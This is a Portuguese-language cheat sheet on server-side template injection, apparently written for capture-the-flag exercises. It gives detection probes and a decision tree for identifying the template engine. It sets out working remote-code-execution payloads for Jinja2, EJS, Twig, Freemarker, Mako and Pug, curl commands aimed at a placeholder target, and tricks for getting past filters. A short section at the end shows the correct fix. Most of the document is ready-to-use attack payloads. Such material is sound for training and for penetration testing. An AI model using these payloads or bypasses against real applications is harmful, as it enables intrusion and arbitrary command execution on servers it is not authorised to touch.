# Server-Side Template Injection (SSTI) — Guia Completo

> Input do utilizador é interpretado como código de template no servidor. Permite execução de código arbitrário (RCE).

## CWE
- CWE-94 — Code Injection

---

## Como reconhecer

A app tem um campo cujo resultado é "renderizado" ou "formatado":
- Report builder / generator
- Card designer / preview
- Email template / newsletter
- Dashboard com nome customizável
- Qualquer campo que "processa" o teu input e mostra o resultado formatado

---

## Teste de deteção (recon)

### Payload universal — testar em qualquer campo
```
{{7*7}}          → 49? Jinja2 ou Twig (Python/PHP)
${7*7}           → 49? Freemarker, Velocity, Mako (Java/Python)
<%= 7*7 %>       → 49? EJS ou ERB (Node.js/Ruby)
#{7*7}           → 49? Pug/Jade (Node.js)
{7*7}            → 49? Smarty (PHP)
```

### SSTI vs XSS — a diferença crucial
- Se `{{7*7}}` aparece como **49** na resposta → **SSTI** (o servidor calculou!)
- Se `{{7*7}}` aparece como texto literal → não é SSTI
- Se `<script>alert(1)</script>` executa no browser → é XSS, não SSTI

**SSTI é server-side** — o cálculo/execução acontece no servidor antes de enviar o HTML.

### Confirmação progressiva
```
{{7*7}}      → 49         (template engine ativa)
{{7*'7'}}    → 7777777    (Jinja2 — repete string)
{{7*'7'}}    → 49         (Twig — multiplica)
```

---

## Identificar a engine

```
                 {{7*7}} = 49?
                 /            \
               SIM            NÃO
              /                  \
      {{7*'7'}} = ?          ${7*7} = 49?
      /          \            /         \
   7777777       49         SIM         NÃO
   Jinja2       Twig     Freemarker  <%= 7*7 %> = 49?
   (Python)     (PHP)     (Java)       /        \
                                     SIM        NÃO
                                     EJS        Outro...
                                   (Node.js)
```

---

## Exploração por engine

### Jinja2 (Python — Flask, Django)

**RCE — método mais fiável:**
```python
{{ cycler.__init__.__globals__.os.popen('cat /flag/flag').read() }}
```

**Alternativas:**
```python
# Via config
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag/flag').read() }}

# Via request
{{ request.__class__.__mro__[1].__subclasses__() }}
# Procurar Popen na lista (índice varia) e chamar

# Via lipsum
{{ lipsum.__globals__.os.popen('cat /flag/flag').read() }}

# Via namespace
{{ namespace.__init__.__globals__.os.popen('cat /flag/flag').read() }}

# Ler ficheiro sem RCE (via builtins)
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/flag/flag').read() }}
```

**Como funciona (para o write-up):**
1. Qualquer objeto Python tem `__class__` → `__mro__` (chain de herança) → `__subclasses__()` (todas as classes carregadas)
2. Entre essas classes estão `os`, `subprocess`, `Popen`, etc.
3. `cycler` é um global do Jinja2 — atalho direto para `os` via `__globals__`

**Curl:**
```bash
curl -X POST http://TARGET/report \
  --data-urlencode "header={{ cycler.__init__.__globals__.os.popen('cat /flag/flag').read() }}"
```

### EJS (Node.js — Express)

**RCE:**
```javascript
<%= process.getBuiltinModule('child_process').execSync('cat /flag/flag').toString() %>
```

**Alternativas (versões mais antigas do Node):**
```javascript
<%= require('child_process').execSync('cat /flag/flag') %>
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

**Curl:**
```bash
curl -X POST http://TARGET/card \
  --data-urlencode "design=<%= process.getBuiltinModule('child_process').execSync('cat /flag/flag').toString() %>"
```

### Twig (PHP)

**RCE:**
```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag/flag")}}
```

**Alternativa:**
```php
{{['cat /flag/flag']|filter('system')}}
```

### Freemarker (Java)

**RCE:**
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag/flag")}
```

**Alternativa:**
```java
${"freemarker.template.utility.Execute"?new()("id")}
```

### Mako (Python)

**RCE:**
```python
${__import__('os').popen('cat /flag/flag').read()}
```

### Pug/Jade (Node.js)

**RCE:**
```javascript
#{global.process.mainModule.require('child_process').execSync('cat /flag/flag')}
```

---

## Bypasses comuns

### Filtro de `_` (underscore)
```python
# Usar request.args ou attr()
{{ ()|attr(request.args.a) }}?a=__class__

# Hex encoding
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}
```

### Filtro de `.` (ponto)
```python
# Usar [] em vez de .
{{ ''['__class__']['__mro__'][1] }}

# Usar |attr()
{{ ''|attr('__class__') }}
```

### Filtro de `{{`
```python
# Usar {% %} (block tags)
{% if ''.__class__.__mro__[1].__subclasses__() %}yes{% endif %}

# Usar {%- print(...) -%}
{%- print(cycler.__init__.__globals__.os.popen('cat /flag/flag').read()) -%}
```

### Filtro de palavras (ex: "os", "popen")
```python
# Concatenação
{{ cycler.__init__.__globals__['o'+'s'].popen('cat /flag/flag').read() }}

# Reversed
{{ cycler.__init__.__globals__['so'[::-1]].popen('cat /flag/flag').read() }}
```

---

## Árvore de decisão

```
Campo de texto que é "processado"?
├── Testar {{7*7}}
│   ├── 49 → SSTI confirmado
│   │   ├── {{7*'7'}} = 7777777 → Jinja2 (Python)
│   │   │   └── {{ cycler.__init__.__globals__.os.popen('CMD').read() }}
│   │   └── {{7*'7'}} = 49 → Twig (PHP)
│   │       └── {{['CMD']|filter('system')}}
│   └── Não → testar ${7*7}
│       ├── 49 → Freemarker (Java) ou Mako (Python)
│       └── Não → testar <%= 7*7 %>
│           ├── 49 → EJS (Node.js)
│           │   └── <%= process.getBuiltinModule('child_process').execSync('CMD') %>
│           └── Não → provavelmente não é SSTI
```

---

## Fix correto

```python
# ERRADO — input como parte do template
from flask import render_template_string
render_template_string(f"Hello {user_input}")
# user_input = "{{7*7}}" → renderiza como template!

# CORRETO — input como variável/contexto
render_template_string("Hello {{ name }}", name=user_input)
# user_input = "{{7*7}}" → aparece como texto literal
```

**Princípio:** nunca usar input do utilizador como parte do **código** do template. Passá-lo sempre como **dados** (variável no contexto do template).

Para EJS:
```javascript
// ERRADO
res.render('page', {}, { source: userInput })

// CORRETO
res.render('page', { name: userInput })
// No template: <%= name %> (auto-escaped)
```
